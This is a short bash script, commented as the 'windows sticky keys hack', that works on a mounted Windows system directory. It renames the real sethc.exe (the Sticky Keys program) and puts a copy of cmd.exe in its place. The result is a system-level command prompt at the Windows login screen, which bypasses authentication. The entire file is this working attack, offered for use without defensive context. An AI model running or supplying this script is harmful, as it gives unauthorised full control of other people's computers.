#!/bin/bash
#execute the windows sticky keys hack

cp "Windows/System32/cmd.exe" "Windows/System32/cmdlol.exe"
mv "Windows/System32/sethc.exe" "Windows/System32/sethcold.exe"
mv "Windows/System32/cmdlol.exe" "Windows/System32/sethc.exe"